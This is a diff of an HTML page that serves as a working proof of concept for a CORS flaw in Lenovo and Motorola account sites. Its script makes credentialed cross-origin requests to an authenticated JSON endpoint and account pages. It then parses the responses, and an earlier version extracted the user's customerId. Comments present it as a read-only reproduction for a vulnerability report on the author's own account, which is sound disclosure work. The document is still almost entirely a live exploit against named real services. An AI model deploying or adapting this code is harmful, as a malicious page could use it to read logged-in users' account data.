@@ -1,52 +1,110 @@
 <!DOCTYPE html>
-<html lang="zh">
-<head><meta charset="utf-8"><title>账号中心 CORS 实测（GET 带凭证 + 提取 customerId）</title></head>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CORS 跨域读取验证 · account.lenovo.com</title>
+<style>
+  body{background:#0f1115;color:#d7dae0;font:14px/1.7 ui-monospace,Consolas,monospace;margin:0;padding:20px}
+  h1{font-size:16px;color:#7ee0b0;margin:0 0 4px}
+  .sub{color:#8b93a1;font-size:12px;margin-bottom:16px}
+  .card{background:#171a21;border:1px solid #262b36;border-radius:8px;padding:12px;margin-bottom:14px}
+  .t{color:#6fb3ff;font-weight:bold;margin-bottom:6px}
+  .ok{color:#7ee0b0}
+  .bad{color:#ff6b6b}
+  .warn{color:#ffc857}
+  pre{white-space:pre-wrap;word-break:break-all;margin:6px 0 0;font-size:12.5px;color:#c8ccd4}
+</style>
+</head>
 <body>
-<pre id="out">运行中…（须在已登录 account.lenovo.com 的浏览器中打开本页）</pre>
+<h1>CORS 跨域读取验证（本人账号 · 只读 GET）</h1>
+<div class="sub">源站 281657124a147.github.io ｜ 目标 account.lenovo.com ｜ 仅读取本人可访问内容，无写入操作</div>
+<div id="out"></div>
+
 <script>
-// 申诉版复现 v2：GET-only + 正确提取 customerId（无引号键 customerId: "xxx"）
-// 去掉 OPTIONS 探测（避免触发 Akamai 反爬连带 GET 被砍）；只做带凭证 GET，读正文并提取账户字段。
 const TARGETS = [
-  'https://account.lenovo.com/us/en/account/home.html',
-  'https://account.motorola.com/us/en/account/home.html'
+  { name: '★认证后 JSON 接口', url: 'https://account.lenovo.com/familyhub/v1/status' },
+  { name: '账户主页 HTML',     url: 'https://account.lenovo.com/us/en/account/home.html' },
+  { name: 'Moto 账户页(对照)', url: 'https://account.motorola.com/us/en/account/home.html' }
 ];
-function findField(body, key){
-  // 兼容 "customerId":"xxx" 与 customerId: "xxx"（无引号键）
-  let re = new RegExp('"?\\b' + key + '\\b"?\\s*:\\s*"([^"\\\\]*)"', 'i');
-  let m = body.match(re);
-  return m ? m[1] : null;
+
+const out = document.getElementById('out');
+function esc(s){ return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
+
+function card(title, cls, html){
+  const d = document.createElement('div');
+  d.className = 'card';
+  d.innerHTML = '<div class="t ' + (cls||'') + '">' + esc(title) + '</div>' + html;
+  out.appendChild(d);
+  return d;
 }
-function ctx(body, key){
-  let i = body.indexOf(key);
-  return i < 0 ? '(无)' : body.slice(Math.max(0,i-70), i+140).replace(/\s+/g,' ');
-}
-async function probe(url){
-  let s = '=== ' + url + ' ===\n';
+
+async function probe(t){
+  const box = card(t.name + ' → ' + t.url, '', '');
   try{
-    const r = await fetch(url, {credentials:'include', cache:'no-store'});
-    const body = await r.text();
-    s += '[GET] status=' + r.status + ' type=' + r.type + ' len=' + body.length + '\n';
-    const cid = findField(body, 'customerId');
-    if(cid !== null){
-      s += '  ★ customerId 命中: "' + cid + '"\n';
-      s += '  命中上下文: ' + ctx(body, 'customerId') + '\n';
-      if(cid.trim() !== ''){
-        s += '  ★★ 跨域读到本人 non-empty customerId —— 已登录用户账户标识被任意站点读取（数据外泄实证）\n';
-      } else {
-        s += '  （customerId 为空串：本请求未带会话 或 服务端未填充）\n';
-      }
+    const started = Date.now();
+    const res = await fetch(t.url, {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'cors',
+      redirect: 'follow',
+      cache: 'no-store',
+      headers: { 'Accept': 'application/json, text/html, */*' }
+    });
+    const body = await res.text();
+    const ms = Date.now() - started;
+    const finalUrl = res.url || '(未知)';
+    const redirected = (finalUrl !== t.url);
+
+    const bodyHead = body.slice(0, 1200);
+    let isJson = false, jsonKeys = '';
+    try{
+      const j = JSON.parse(body);
+      isJson = true;
+      jsonKeys = Object.keys(j).slice(0, 25).join(', ');
+    }catch(e){}
+
+    let verdict, vcls;
+    if (redirected && /login/i.test(finalUrl)) {
+      verdict = '⚠ 被重定向到登录页 → 当前浏览器在该域无有效登录态（本次未读到账户数据）';
+      vcls = 'warn';
+    } else if (isJson) {
+      verdict = '★★★ 危害实证：跨域带凭证成功读取 JSON 数据（字段：' + jsonKeys + '）';
+      vcls = 'ok';
+    } else if (res.status === 200 && body.length > 0) {
+      verdict = '✅ 跨域带凭证成功读取响应体（非 JSON，长度 ' + body.length + ' 字节）';
+      vcls = 'ok';
     } else {
-      s += '  customerId 字段未找到；上下文: ' + ctx(body, 'customerId') + '\n';
+      verdict = '⚠ 状态 ' + res.status + '，响应体长度 ' + body.length;
+      vcls = 'warn';
     }
-    s += '  正文前200字符: ' + body.slice(0,200).replace(/\s+/g,' ') + '\n';
-  }catch(e){ s += '[GET] 被拦截: ' + e + '\n'; }
-  return s;
+
+    box.innerHTML =
+      '<div class="t">' + esc(t.name) + '</div>' +
+      '<pre>' +
+      'HTTP status      : ' + res.status + ' ' + esc(res.statusText) + '\n' +
+      'response.type    : ' + res.type + '\n' +
+      '最终 URL         : ' + esc(finalUrl) + '\n' +
+      '是否被重定向     : ' + (redirected ? '是' : '否') + '\n' +
+      '耗时             : ' + ms + ' ms\n' +
+      '响应体长度       : ' + body.length + ' 字节\n' +
+      '是否 JSON        : ' + (isJson ? '是 → 键: ' + esc(jsonKeys) : '否') + '\n' +
+      '</pre>' +
+      '<div class="' + vcls + '" style="margin:8px 0">' + esc(verdict) + '</div>' +
+      '<pre>--- 响应体前 1200 字符 ---\n' + esc(bodyHead) + '</pre>';
+
+  }catch(err){
+    box.innerHTML =
+      '<div class="t">' + esc(t.name) + '</div>' +
+      '<pre class="bad">Failed to fetch：' + esc(err.name + ': ' + err.message) + '\n\n' +
+      '说明：浏览器在客户端拦截了这次跨域请求（通常为跟踪防护/扩展），\n' +
+      '不代表服务器未返回允许跨域的响应头。</pre>';
+  }
 }
-(async()=>{
-  let log = '⚠️ 前提：本页源为外网 HTTPS 域名(Origin≠null) + 浏览器已登录本人 Lenovo ID\n\n';
-  for(const u of TARGETS){ log += await probe(u) + '\n'; }
-  document.getElementById('out').textContent = log;
-  console.log(log);
+
+(async () => {
+  for (const t of TARGETS) { await probe(t); }
+  card('完成', 'ok', '<pre>三个目标测试完毕。若第一条出现 ★★★，即为「已登录用户数据可被任意站点跨域读取」的实证。</pre>');
 })();
 </script>
 </body>
